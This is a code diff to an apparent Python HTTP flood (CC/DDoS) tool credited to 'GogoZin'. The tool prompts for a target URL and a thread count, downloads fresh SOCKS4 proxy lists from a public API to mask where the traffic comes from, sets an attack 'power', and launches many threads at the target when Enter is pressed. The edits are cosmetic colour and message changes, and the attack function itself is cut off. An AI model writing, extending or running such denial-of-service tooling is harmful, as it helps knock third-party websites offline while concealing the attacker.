@@ -156,9 +156,9 @@ def opth():
 		x = threading.Thread(target=atk)
 		x.start()
 		print("Threads " + str(i+1) + " Created")
-	print("Wait A Few Seconds For Threads Ready To Attack ...")
+	print("[+] Wait A Few Seconds For Threads Ready To Attack")
 	time.sleep(3)
-	input("Press Enter To Launch Attack !")
+	input("[+] Press Enter To Launch Attack !")
 	global on 
 	on = True
 
@@ -171,25 +171,26 @@ def main():
 	global pwr
 	global thr
 	global on
-	url = str(input("[+] URL (http://expample.com) : "))
-	thr = int(input("[+] Threads : "))
-	cho = str(input("[+] Get Some Fresh Socks ? (y/n) : "))
+	url = str(input(Fore.BLUE + "[+] URL (http://expample.com) : " + Fore.WHITE))
+	thr = int(input(Fore.BLUE + "[+] Threads : " + Fore.WHITE))
+	cho = str(input(Fore.BLUE + "[+] Do You Want To Download Socks4 ? (y/n) : " + Fore.WHITE))
 	if cho =='y':
-		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all') 
+		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=2000&country=all') #Code By GogoZin
 		with open('socks.txt','wb') as fp:
 			fp.write(rsp.content)
-			print("[✓] Sucess Get Fresh Socks List !")
+			print(Fore.YELLOW + "[+] Sucess Get Fresh Socks List !")
 	else:
 		pass
-	list = str(input("[+] Socks List (socks4.txt): "))
+	list = str(input(Fore.BLUE + "[+] Socks List (socks4.txt): " + Fore.WHITE))
 	if list =="":
 		list = 'socks4.txt'
 	else:
 		list = str(list)
 	pprr = open(list).readlines()
-	print("[+] Socks Count : " + "%d " %len(pprr))
-	pwr = int(input("[+] CC.Power (1-100) : "))
+	print(Fore.BLUE + "[+] Socks Count : " + Fore.WHITE + "%d " %len(pprr))
+	pwr = int(input(Fore.BLUE + "[+] CC.Power (1-100) : " + Fore.WHITE))
 	opth()
+
 
 def atk():
 	pprr = open(list).readlines()
